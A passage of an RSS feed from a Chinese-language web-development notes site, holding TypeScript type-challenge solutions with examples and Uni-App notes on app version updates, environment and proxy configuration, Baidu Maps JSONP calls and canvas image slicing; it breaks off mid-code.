<div><pre><code><span>type</span> <span>First<span>&lt;</span><span>T</span> <span>extends</span> <span>unknown</span><span>[</span><span>]</span><span>></span></span> <span>=</span> <span>T</span> <span>extends</span> <span>[</span><span>infer</span> <span>R</span><span>,</span> <span>...</span><span>infer</span> Rest<span>]</span> <span>?</span> <span>R</span> <span>:</span> <span>never</span>
</code></pre>
<div><span>1</span><br></div></div><ul>
<li>Example</li>
</ul>
<div><pre><code><span>type</span> <span>arr1</span> <span>=</span> <span>[</span><span>'a'</span><span>,</span> <span>'b'</span><span>,</span> <span>'c'</span><span>]</span>
<span>type</span> <span>arr2</span> <span>=</span> <span>[</span><span>3</span><span>,</span> <span>2</span><span>,</span> <span>1</span><span>]</span>

<span>type</span> <span>head1</span> <span>=</span> First<span>&lt;</span>arr1<span>></span> <span>// expected to be 'a'</span>
<span>type</span> <span>head2</span> <span>=</span> First<span>&lt;</span>arr2<span>></span> <span>// expected to be 3</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br></div></div><h2 id="_6-获取元祖长度"> 6. 获取元祖长度</h2>
<div><pre><code><span>type</span> <span>Length<span>&lt;</span><span>T</span> <span>extends</span> <span>readonly</span> <span>unknown</span><span>[</span><span>]</span><span>></span></span> <span>=</span> <span>T</span><span>[</span><span>'length'</span><span>]</span>
</code></pre>
<div><span>1</span><br></div></div><ul>
<li>Example</li>
</ul>
<div><pre><code><span>type</span> <span>tesla</span> <span>=</span> <span>[</span><span>'tesla'</span><span>,</span> <span>'model 3'</span><span>,</span> <span>'model X'</span><span>,</span> <span>'model Y'</span><span>]</span>
<span>type</span> <span>spaceX</span> <span>=</span> <span>[</span>
  <span>'FALCON 9'</span><span>,</span>
  <span>'FALCON HEAVY'</span><span>,</span>
  <span>'DRAGON'</span><span>,</span>
  <span>'STARSHIP'</span><span>,</span>
  <span>'HUMAN SPACEFLIGHT'</span>
<span>]</span>

<span>type</span> <span>teslaLength</span> <span>=</span> Length<span>&lt;</span>tesla<span>></span> <span>// expected 4</span>
<span>type</span> <span>spaceXLength</span> <span>=</span> Length<span>&lt;</span>spaceX<span>></span> <span>// expected 5</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br></div></div><h2 id="_7-exclude"> 7. Exclude</h2>
<div><pre><code><span>type</span> <span>MyExclude<span>&lt;</span><span>T</span><span>,</span> <span>U</span><span>></span></span> <span>=</span> <span>T</span> <span>extends</span> <span><span>U</span></span> <span>?</span> <span>never</span> <span>:</span> <span>T</span>
</code></pre>
<div><span>1</span><br></div></div><ul>
<li>Example</li>
</ul>
<div><pre><code><span>type</span> <span>union</span> <span>=</span> <span>'a'</span> <span>|</span> <span>'b'</span> <span>|</span> <span>'c'</span>

<span>type</span> <span>result</span> <span>=</span> MyExclude<span>&lt;</span>union<span>,</span> <span>'a'</span><span>></span> <span>// expected "b" | "c"</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br></div></div><h2 id="_8-awaited"> 8. Awaited</h2>
<div><pre><code><span>type</span> <span>MyAwaited<span>&lt;</span><span>T</span><span>></span></span> <span>=</span> <span>T</span> <span>extends</span> <span><span>Promise</span><span>&lt;</span><span>infer</span> <span>R</span><span>></span></span> <span>?</span> MyAwaited<span>&lt;</span><span>R</span><span>></span> <span>:</span> <span>T</span>
</code></pre>
<div><span>1</span><br></div></div><ul>
<li>Example</li>
</ul>
<div><pre><code><span>type</span> <span><span>Z</span></span> <span>=</span> <span>Promise</span><span>&lt;</span><span>Promise</span><span>&lt;</span><span>string</span> <span>|</span> <span>number</span><span>>></span>

<span>type</span> <span>result</span> <span>=</span> MyAwaited<span>&lt;</span><span>Z</span><span>></span> <span>// expected string | number</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br></div></div><h2 id="_9-if"> 9. If</h2>
<div><pre><code><span>type</span> <span>If<span>&lt;</span><span>C</span><span>,</span> <span>T</span><span>,</span> <span>F</span><span>></span></span> <span>=</span> <span>C</span> <span>extends</span> <span><span>true</span></span> <span>?</span> <span>T</span> <span>:</span> <span>F</span>
</code></pre>
<div><span>1</span><br></div></div><ul>
<li>Example</li>
</ul>
<div><pre><code><span>type</span> <span><span>A</span></span> <span>=</span> If<span>&lt;</span><span>true</span><span>,</span> <span>'a'</span><span>,</span> <span>'b'</span><span>></span> <span>// expected to be 'a'</span>
<span>type</span> <span><span>B</span></span> <span>=</span> If<span>&lt;</span><span>false</span><span>,</span> <span>'a'</span><span>,</span> <span>'b'</span><span>></span> <span>// expected to be 'b'</span>
</code></pre>
<div><span>1</span><br><span>2</span><br></div></div><h2 id="_10-concat"> 10. Concat</h2>
<div><pre><code><span>type</span> <span>Concat<span>&lt;</span><span>T</span> <span>extends</span> <span>unknown</span><span>[</span><span>]</span><span>,</span> <span>U</span> <span>extends</span> <span>unknown</span><span>[</span><span>]</span><span>></span></span> <span>=</span> <span>[</span><span>...</span><span>T</span><span>,</span> <span>...</span><span>U</span><span>]</span>
</code></pre>
<div><span>1</span><br></div></div><ul>
<li>Example</li>
</ul>
<div><pre><code><span>type</span> <span>Result</span> <span>=</span> Concat<span>&lt;</span><span>[</span><span>1</span><span>]</span><span>,</span> <span>[</span><span>2</span><span>]</span><span>></span> <span>// expected to be [1, 2]</span>
</code></pre>
<div><span>1</span><br></div></div><h2 id="_11-includes"> 11. Includes</h2>
<div><pre><code><span>type</span> <span>IsEqual<span>&lt;</span><span>X</span><span>,</span> <span>Y</span><span>></span></span> <span>=</span> <span>(</span><span>&lt;</span><span>T</span><span>></span><span>(</span><span>)</span> <span>=></span> <span>T</span> <span>extends</span> <span><span>X</span></span> <span>?</span> <span>1</span> <span>:</span> <span>2</span><span>)</span> <span>extends</span> <span>&lt;</span><span>T</span><span>></span><span>(</span><span>)</span> <span>=></span> <span>T</span> <span>extends</span> <span><span>Y</span></span>
  <span>?</span> <span>1</span>
  <span>:</span> <span>2</span>
  <span>?</span> <span>true</span>
  <span>:</span> <span>false</span>

<span>type</span> <span>Includes<span>&lt;</span><span>T</span> <span>extends</span> <span>readonly</span> <span>any</span><span>[</span><span>]</span><span>,</span> <span>U</span><span>></span></span> <span>=</span> <span>T</span> <span>extends</span> <span>[</span><span>infer</span> <span>F</span><span>,</span> <span>...</span><span>infer</span> <span>R</span><span>]</span>
  <span>?</span> IsEqual<span>&lt;</span><span>F</span><span>,</span> <span>U</span><span>></span> <span>extends</span> <span><span>true</span></span>
    <span>?</span> <span>true</span>
    <span>:</span> Includes<span>&lt;</span><span>R</span><span>,</span> <span>U</span><span>></span>
  <span>:</span> <span>false</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br></div></div><ul>
<li>Example</li>
</ul>
<div><pre><code><span>type</span> <span>isPillarMen</span> <span>=</span> Includes<span>&lt;</span><span>[</span><span>'Kars'</span><span>,</span> <span>'Esidisi'</span><span>,</span> <span>'Wamuu'</span><span>,</span> <span>'Santana'</span><span>]</span><span>,</span> <span>'Dio'</span><span>></span> <span>// expected to be `false`</span>
</code></pre>
<div><span>1</span><br></div></div><h2 id="_12-push"> 12. Push</h2>
<div><pre><code><span>type</span> <span>Push<span>&lt;</span><span>T</span> <span>extends</span> <span>unknown</span><span>[</span><span>]</span><span>,</span> <span>U</span><span>></span></span> <span>=</span> <span>[</span><span>...</span><span>T</span><span>,</span> <span>U</span><span>]</span>
</code></pre>
<div><span>1</span><br></div></div><ul>
<li>Example</li>
</ul>
<div><pre><code><span>type</span> <span>Result</span> <span>=</span> Push<span>&lt;</span><span>[</span><span>1</span><span>,</span> <span>2</span><span>]</span><span>,</span> <span>'3'</span><span>></span> <span>// [1, 2, '3']</span>
</code></pre>
<div><span>1</span><br></div></div><h2 id="_13-unshift"> 13. Unshift</h2>
<div><pre><code><span>type</span> <span>Unshift<span>&lt;</span><span>T</span> <span>extends</span> <span>unknown</span><span>[</span><span>]</span><span>,</span> <span>U</span><span>></span></span> <span>=</span> <span>[</span><span>U</span><span>,</span> <span>...</span><span>T</span><span>]</span>
</code></pre>
<div><span>1</span><br></div></div><ul>
<li>Example</li>
</ul>
<div><pre><code><span>type</span> <span>Result</span> <span>=</span> Unshift<span>&lt;</span><span>[</span><span>1</span><span>,</span> <span>2</span><span>]</span><span>,</span> <span>0</span><span>></span> <span>// [0, 1, 2,]</span>
</code></pre>
<div><span>1</span><br></div></div><h2 id="_14-myparameters"> 14. MyParameters</h2>
<div><pre><code><span>type</span> <span>MyParameters<span>&lt;</span><span>T</span> <span>extends</span> <span>(</span><span>...</span>args<span>:</span> <span>any</span><span>[</span><span>]</span><span>)</span> <span>=></span></span> <span>any</span><span>></span> <span>=</span> <span>T</span> <span>extends</span> <span>(</span>
  <span>...</span>args<span>:</span> <span>infer</span> <span>P</span>
<span>)</span> <span>=></span> <span>any</span>
  <span>?</span> <span>P</span>
  <span>:</span> <span>never</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br></div></div><ul>
<li>Example</li>
</ul>
<div><pre><code><span>const</span> foo <span>=</span> <span>(</span>arg1<span>:</span> <span>string</span><span>,</span> arg2<span>:</span> <span>number</span><span>)</span><span>:</span> <span>void</span> <span>=></span> <span>{</span><span>}</span>

<span>type</span> <span>result</span> <span>=</span> MyParameters<span>&lt;</span><span>typeof</span> foo<span>></span> <span>// expected [arg1: string, arg2: number]</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br></div></div><h2 id="_15-获取函数返回类型"> 15. 获取函数返回类型</h2>
<div><pre><code><span>type</span> <span>MyReturnType<span>&lt;</span><span>T</span> <span>extends</span> <span>(</span><span>...</span>args<span>:</span> <span>any</span><span>)</span> <span>=></span></span> <span>any</span><span>></span> <span>=</span> <span>T</span> <span>extends</span> <span>(</span>
  <span>...</span>args<span>:</span> <span>any</span>
<span>)</span> <span>=></span> <span>infer</span> <span>R</span>
  <span>?</span> <span>R</span>
  <span>:</span> <span>any</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br></div></div><ul>
<li>Example</li>
</ul>
<div><pre><code><span>const</span> <span>fn</span> <span>=</span> <span>(</span>v<span>:</span> <span>boolean</span><span>)</span> <span>=></span> <span>{</span>
  <span>if</span> <span>(</span>v<span>)</span> <span>return</span> <span>1</span>
  <span>else</span> <span>return</span> <span>2</span>
<span>}</span>

<span>type</span> <span>a</span> <span>=</span> MyReturnType<span>&lt;</span><span>typeof</span> fn<span>></span> <span>// expected "1 | 2"</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br></div></div><h2 id="_16-获取函数返回类型"> 16. 获取函数返回类型</h2>
<div><pre><code><span>type</span> <span>MyReturnType<span>&lt;</span><span>T</span> <span>extends</span> <span>(</span><span>...</span>args<span>:</span> <span>any</span><span>)</span> <span>=></span></span> <span>any</span><span>></span> <span>=</span> <span>T</span> <span>extends</span> <span>(</span>
  <span>...</span>args<span>:</span> <span>any</span>
<span>)</span> <span>=></span> <span>infer</span> <span>R</span>
  <span>?</span> <span>R</span>
  <span>:</span> <span>any</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br></div></div><ul>
<li>Example</li>
</ul>
<div><pre><code><span>const</span> <span>fn</span> <span>=</span> <span>(</span>v<span>:</span> <span>boolean</span><span>)</span> <span>=></span> <span>{</span>
  <span>if</span> <span>(</span>v<span>)</span> <span>return</span> <span>1</span>
  <span>else</span> <span>return</span> <span>2</span>
<span>}</span>

<span>type</span> <span>a</span> <span>=</span> MyReturnType<span>&lt;</span><span>typeof</span> fn<span>></span> <span>// expected "1 | 2"</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br></div></div><h2 id="_17-omit"> 17. Omit</h2>
<div><pre><code><span>type</span> <span>MyOmit<span>&lt;</span><span>T</span><span>,</span> <span>K</span> <span>extends</span> <span>keyof</span> <span>any</span><span>></span></span> <span>=</span> Pick<span>&lt;</span><span>T</span><span>,</span> Exclude<span>&lt;</span><span>keyof</span> <span>T</span><span>,</span> <span>K</span><span>>></span>
</code></pre>
<div><span>1</span><br></div></div><ul>
<li>Example</li>
</ul>
<div><pre><code><span>interface</span> <span>Todo</span> <span>{</span>
  title<span>:</span> <span>string</span>
  description<span>:</span> <span>string</span>
  completed<span>:</span> <span>boolean</span>
<span>}</span>

<span>type</span> <span>TodoPreview</span> <span>=</span> MyOmit<span>&lt;</span>Todo<span>,</span> <span>'description'</span> <span>|</span> <span>'title'</span><span>></span>

<span>const</span> todo<span>:</span> TodoPreview <span>=</span> <span>{</span>
  completed<span>:</span> <span>false</span><span>,</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br></div></div><h2 id="_18-readonly-2"> 18. Readonly 2</h2>
<div><pre><code><span>type</span> <span>MyReadonly2<span>&lt;</span><span>T</span><span>,</span> <span>K</span> <span>extends</span> <span>keyof</span> <span>T</span> <span>=</span> <span>keyof</span> <span>T</span><span>></span></span> <span>=</span> <span>{</span>
  <span>readonly</span> <span>[</span><span>P</span> <span>in</span> <span>keyof</span> <span>T</span><span>]</span><span>:</span> <span>T</span><span>[</span><span>P</span><span>]</span>
<span>}</span> <span>&amp;</span> <span>{</span>
  <span>[</span><span>P</span> <span>in</span> Exclude<span>&lt;</span><span>keyof</span> <span>T</span><span>,</span> <span>K</span><span>></span><span>]</span><span>:</span> <span>T</span><span>[</span><span>P</span><span>]</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br></div></div><ul>
<li>Example</li>
</ul>
<div><pre><code><span>interface</span> <span>Todo</span> <span>{</span>
  title<span>:</span> <span>string</span>
  description<span>:</span> <span>string</span>
  completed<span>:</span> <span>boolean</span>
<span>}</span>

<span>const</span> todo<span>:</span> MyReadonly2<span>&lt;</span>Todo<span>,</span> <span>'title'</span> <span>|</span> <span>'description'</span><span>></span> <span>=</span> <span>{</span>
  title<span>:</span> <span>'Hey'</span><span>,</span>
  description<span>:</span> <span>'foobar'</span><span>,</span>
  completed<span>:</span> <span>false</span><span>,</span>
<span>}</span>

todo<span>.</span>title <span>=</span> <span>'Hello'</span> <span>// Error: cannot reassign a readonly property</span>
todo<span>.</span>description <span>=</span> <span>'barFoo'</span> <span>// Error: cannot reassign a readonly property</span>
todo<span>.</span>completed <span>=</span> <span>true</span> <span>// OK</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br></div></div><h2 id="_19-深度-readonly"> 19. 深度 Readonly</h2>
<div><pre><code><span>type</span> <span>DeepReadonly<span>&lt;</span><span>T</span><span>></span></span> <span>=</span> <span>T</span> <span>extends</span> <span>Record<span>&lt;</span><span>string</span><span>,</span> <span>unknown</span><span>></span></span> <span>|</span> <span>Array</span><span>&lt;</span><span>unknown</span><span>></span>
  <span>?</span> <span>{</span> <span>readonly</span> <span>[</span>k <span>in</span> <span>keyof</span> <span>T</span><span>]</span><span>:</span> DeepReadonly<span>&lt;</span><span>T</span><span>[</span>k<span>]</span><span>></span> <span>}</span>
  <span>:</span> <span>T</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br></div></div><ul>
<li>Example</li>
</ul>
<div><pre><code><span>type</span> <span><span>X</span></span> <span>=</span> <span>{</span>
  x<span>:</span> <span>{</span>
    a<span>:</span> <span>1</span>
    b<span>:</span> <span>'hi'</span>
  <span>}</span>
  y<span>:</span> <span>'hey'</span>
<span>}</span>

<span>type</span> <span>Expected</span> <span>=</span> <span>{</span>
  <span>readonly</span> x<span>:</span> <span>{</span>
    <span>readonly</span> a<span>:</span> <span>1</span>
    <span>readonly</span> b<span>:</span> <span>'hi'</span>
  <span>}</span>
  <span>readonly</span> y<span>:</span> <span>'hey'</span>
<span>}</span>

<span>type</span> <span>Todo</span> <span>=</span> DeepReadonly<span>&lt;</span><span>X</span><span>></span> <span>// should be same as `Expected`</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br></div></div>]]></content:encoded>
    </item>
    <item>
      <title>APP</title>
      <link>https://www.matrixtheone.ga/web/note/Uni-App/App/</link>
      <guid>https://www.matrixtheone.ga/web/note/Uni-App/App/</guid>
      <source url="https://www.matrixtheone.ga/web/rss.xml">APP</source>
      <category>App</category>
      <pubDate>Mon, 08 May 2023 14:48:34 GMT</pubDate>
      <content:encoded><![CDATA[<h2 id="_1-android-证书生成网址"> 1. Android 证书生成网址</h2>
<ul>
<li>
<ol>
<li><a href="https://www.yunedit.com/" target="_blank" rel="noopener noreferrer">香蕉云编</a></li>
</ol>
</li>
<li>
<ol start="2">
<li><a href="http://www.applicationloader.net/appuploader/keystore.php" target="_blank" rel="noopener noreferrer">applicationloader</a></li>
</ol>
</li>
</ul>
<h2 id="_2-版本更新-plugin"> 2. 版本更新 <a href="https://ext.dcloud.net.cn/plugin?id=4405" target="_blank" rel="noopener noreferrer">plugin</a></h2>
<ul>
<li>
<p>main.js。</p>
<div><pre><code><span>import</span> Version <span>from</span> <span>'./js_sdk/swfq-notification-progress/notification/version'</span>

<span>Vue</span><span>.</span>prototype<span>.</span>Version <span>=</span> Version

<span>const</span> app <span>=</span> <span>new</span> <span>Vue</span><span>(</span><span>{</span>
  <span>...</span>App<span>,</span>
  store<span>,</span>
  Version<span>,</span>
<span>}</span><span>)</span>
app<span>.</span><span>$mount</span><span>(</span><span>)</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br></div></div></li>
<li>
<p>home.vue。</p>
<blockquote>
<p>在 Vuex 获取/存储新版本信息（newestVersion）。</p>
</blockquote>
<div><pre><code><span>/**
 * @description: 检测版本
 * @author: ljw
 */</span>
<span>detectionVersion</span><span>(</span><span>)</span> <span>{</span>
  <span>const</span> <span>{</span> ios_version_code<span>,</span> android_version_code <span>}</span> <span>=</span> <span>this</span><span>.</span>newestVersion
  <span>if</span> <span>(</span>uni<span>.</span><span>getSystemInfoSync</span><span>(</span><span>)</span><span>.</span>platform <span>===</span> <span>'android'</span><span>)</span> <span>{</span>
    <span>if</span> <span>(</span>plus<span>.</span>runtime<span>.</span>versionCode <span>&lt;</span> android_version_code<span>)</span>
      <span>this</span><span>.</span>visible <span>=</span> <span>true</span>
  <span>}</span> <span>else</span> <span>{</span>
    <span>if</span> <span>(</span>plus<span>.</span>runtime<span>.</span>versionCode <span>&lt;</span> ios_version_code<span>)</span> <span>this</span><span>.</span>visible <span>=</span> <span>true</span>
  <span>}</span>
<span>}</span><span>,</span>
<span>/**
 * @description: 下载新版本
 * @author: ljw
 */</span>
<span>downloadApp</span><span>(</span><span>)</span> <span>{</span>
  <span>const</span> <span>{</span> ios_url<span>,</span> android_url <span>}</span> <span>=</span> <span>this</span><span>.</span>newestVersion
  <span>this</span><span>.</span>visible <span>=</span> <span>false</span>
  <span>if</span> <span>(</span>uni<span>.</span><span>getSystemInfoSync</span><span>(</span><span>)</span><span>.</span>platform <span>===</span> <span>'android'</span><span>)</span> <span>{</span>
    <span>this</span><span>.</span>Version<span>.</span><span>downloadApkAndShowProgressForUpdate</span><span>(</span>android_url<span>)</span>
  <span>}</span> <span>else</span> <span>{</span>
    plus<span>.</span>runtime<span>.</span><span>openURL</span><span>(</span>ios_url<span>)</span>
  <span>}</span>
<span>}</span><span>,</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br></div></div></li>
</ul>
]]></content:encoded>
    </item>
    <item>
      <title>Config</title>
      <link>https://www.matrixtheone.ga/web/note/Uni-App/Config/</link>
      <guid>https://www.matrixtheone.ga/web/note/Uni-App/Config/</guid>
      <source url="https://www.matrixtheone.ga/web/rss.xml">Config</source>
      <category>Uni App</category>
      <pubDate>Mon, 08 May 2023 14:48:34 GMT</pubDate>
      <content:encoded><![CDATA[<h2 id="_1-环境配置"> 1. 环境配置</h2>
<ul>
<li>
<p>App.vue</p>
<div><pre><code><span>import</span> <span>'.env.js'</span>

<span>export</span> <span>default</span> <span>{</span>
  <span>globalData</span><span>:</span> <span>UNI_ENV</span><span>,</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br></div></div></li>
<li>
<p>env.js</p>
<div><pre><code><span>;</span><span>(</span><span>function</span> <span>(</span><span>)</span> <span>{</span>
  <span>UNI_ENV</span> <span>=</span>
    process<span>.</span>env<span>.</span><span>NODE_ENV</span> <span>===</span> <span>'development'</span>
      <span>?</span> <span>require</span><span>(</span><span>'.env.dev.js'</span><span>)</span>
      <span>:</span> <span>require</span><span>(</span><span>'.env.prod.js'</span><span>)</span>
<span>}</span><span>)</span><span>(</span><span>)</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br></div></div></li>
<li>
<p>env.dev.js</p>
<blockquote>
<p>为了调试方便使用浏览器预览，在 manifest.json 配置代理。</p>
</blockquote>
<div><pre><code><span>const</span> <span>UNI_ENV</span> <span>=</span> <span>{</span>
  <span>BASE_API</span><span>:</span> <span>'/agency'</span><span>,</span>
  <span>COINDOG_API</span><span>:</span> <span>'/coindog-agency'</span><span>,</span>
<span>}</span>

module<span>.</span>exports <span>=</span> <span>UNI_ENV</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br></div></div></li>
<li>
<p>env.prod.js</p>
<div><pre><code><span>const</span> <span>UNI_ENV</span> <span>=</span> <span>{</span>
  <span>BASE_API</span><span>:</span> <span>'https://www.coderljw.ga'</span><span>,</span>
  <span>COINDOG_API</span><span>:</span> <span>'http://api.coindog.com'</span><span>,</span>
<span>}</span>

module<span>.</span>exports <span>=</span> <span>UNI_ENV</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br></div></div></li>
</ul>
<h2 id="_2-manifest-json"> 2. manifest.json</h2>
<div><pre><code><span>{</span>
  <span>"h5"</span><span>:</span> <span>{</span>
    <span>"devServer"</span><span>:</span> <span>{</span>
      <span>"port"</span><span>:</span> <span>9000</span><span>,</span>
      <span>// 开发App/H5浏览器预览</span>
      <span>"proxy"</span><span>:</span> <span>{</span>
        <span>"/agency"</span><span>:</span> <span>{</span>
          <span>"target"</span><span>:</span> <span>"http://www.coderljw.ga:4396"</span><span>,</span>
          <span>"changeOrigin"</span><span>:</span> <span>true</span><span>,</span>
          <span>"pathRewrite"</span><span>:</span> <span>{</span>
            <span>"^/agency"</span><span>:</span> <span>""</span>
          <span>}</span>
        <span>}</span><span>,</span>
        <span>"/coindog-agency"</span><span>:</span> <span>{</span>
          <span>"target"</span><span>:</span> <span>"http://api.coindog.com/topic/list"</span><span>,</span>
          <span>"changeOrigin"</span><span>:</span> <span>true</span><span>,</span>
          <span>"pathRewrite"</span><span>:</span> <span>{</span>
            <span>"^/coindog-agency"</span><span>:</span> <span>""</span>
          <span>}</span>
        <span>}</span>
      <span>}</span>
    <span>}</span>
  <span>}</span><span>,</span>
  <span>"app-plus"</span><span>:</span> <span>{</span>
    <span>// App去除开屏雪花加载</span>
    <span>"splashscreen"</span><span>:</span> <span>{</span>
      <span>"alwaysShowBeforeRender"</span><span>:</span> <span>false</span><span>,</span>
      <span>"waiting"</span><span>:</span> <span>false</span><span>,</span>
      <span>"autoclose"</span><span>:</span> <span>true</span><span>,</span>
      <span>"delay"</span><span>:</span> <span>0</span>
    <span>}</span>
  <span>}</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br></div></div><h2 id="_3-pages-json"> 3. pages.json</h2>
<div><pre><code><span>{</span>
  <span>"globalStyle"</span><span>:</span> <span>{</span>
    <span>"navigationStyle"</span><span>:</span> <span>"custom"</span><span>,</span>
    <span>"backgroundColor"</span><span>:</span> <span>"#040404"</span><span>,</span>
    <span>// App全局配置</span>
    <span>"app-plus"</span><span>:</span> <span>{</span>
      <span>"titleNView"</span><span>:</span> <span>false</span><span>,</span>
      <span>"bounce"</span><span>:</span> <span>"none"</span><span>,</span>
      <span>"background"</span><span>:</span> <span>"#040404"</span><span>,</span>
      <span>"animationAlphaBGColor"</span><span>:</span> <span>"#040404"</span><span>,</span>
      <span>"animationType"</span><span>:</span> <span>"slide-in-right"</span>
    <span>}</span>
  <span>}</span><span>,</span>
  <span>// easycom模式使用组件</span>
  <span>"easycom"</span><span>:</span> <span>{</span>
    <span>"^u-(.*)"</span><span>:</span> <span>"uview-ui/components/u-$1/u-$1.vue"</span><span>,</span>
    <span>"^c-(.*)"</span><span>:</span> <span>"@/components/c-$1.vue"</span>
  <span>}</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br></div></div>]]></content:encoded>
    </item>
    <item>
      <title>H5</title>
      <link>https://www.matrixtheone.ga/web/note/Uni-App/H5/</link>
      <guid>https://www.matrixtheone.ga/web/note/Uni-App/H5/</guid>
      <source url="https://www.matrixtheone.ga/web/rss.xml">H5</source>
      <category>H5</category>
      <pubDate>Mon, 08 May 2023 14:48:34 GMT</pubDate>
      <content:encoded><![CDATA[<h2 id="_1-h5-调用百度地图-api-跨域"> 1. H5 调用百度地图 api 跨域</h2>
<ul>
<li>
<p>main.js</p>
<div><pre><code><span>import</span> <span>{</span> VueJsonp <span>}</span> <span>from</span> <span>'vue-jsonp'</span>
Vue<span>.</span><span>use</span><span>(</span>VueJsonp<span>)</span>
</code></pre>
<div><span>1</span><br><span>2</span><br></div></div></li>
<li>
<p>使用示例。</p>
<div><pre><code><span>this</span><span>.</span><span>$jsonp</span><span>(</span>
  <span><span>`</span><span>https://api.map.baidu.com/geoconv/v1/?coords=</span><span><span>${</span>dLon<span>}</span></span><span>,</span><span><span>${</span>dLat<span>}</span></span><span>&amp;from=1&amp;to=5&amp;ak=</span><span><span>${</span><span>BMAP_KEY</span><span>}</span></span><span>`</span></span>
<span>)</span><span>.</span><span>then</span><span>(</span>console<span>.</span>log<span>)</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br></div></div></li>
</ul>
<h2 id="_2-图片切割成-9-份"> 2. 图片切割成 9 份</h2>
<div><pre><code><span>cutImg</span><span>(</span><span>)</span> <span>{</span>
  <span>const</span> <span>render</span> <span>=</span> <span>(</span><span>x<span>,</span> y<span>,</span> index</span><span>)</span> <span>=></span> <span>{</span>
    <span>const</span> canvas <span>=</span> document<span>.</span><span>createElement</span><span>(</span><span>'canvas'</span><span>)</span>
    canvas<span>.</span>width <span>=</span> uni<span>.</span><span>upx2px</span><span>(</span><span>225</span><span>)</span>
    canvas<span>.</span>height <span>=</span> uni<span>.</span><span>upx2px</span><span>(</span><span>225</span><span>)</span>
    <span>const</span> ctx <span>=</span> canvas<span>.</span><span>getContext</span><span>(</span><span>'2d'</span><span>)</span>
    <span>const</span> img <span>=</span> <span>new</span> <span>Image</span><span>(</span><span>)</span>
    img<span>.</span>src <span>=</span> <span>require</span><span>(</span><span>'../static/5t5.jpg'</span><span>)</span>
    img<span>.</span><span>setAttribute</span><span>(</span><span>'crossOrigin'</span><span>,</span> <span>'Anonymous'</span><span>)</span>
    img<span>.</span><span>onload</span> <span>=</span> <span>(</span><span>)</span> <span>=></span> <span>{</span>
      <span>const</span> width <span>=</span> img<span>.</span>width <span>/</span> <span>3</span>
      ctx<span>.</span><span>drawImage</span><span>(</span>
        img<span>,</span>
        x <span>*</span> width<span>,</span>
        y <span>*</span> width<span>,</span>
        width<span>,</span>
        width<span>,</span>
        <span>0</span><span>,</span>
        <span>0</span><span>,</span>
        uni<span>.</span><span>upx2px</span><span>(</span><span>225</span><span>)</span><span>,</span>
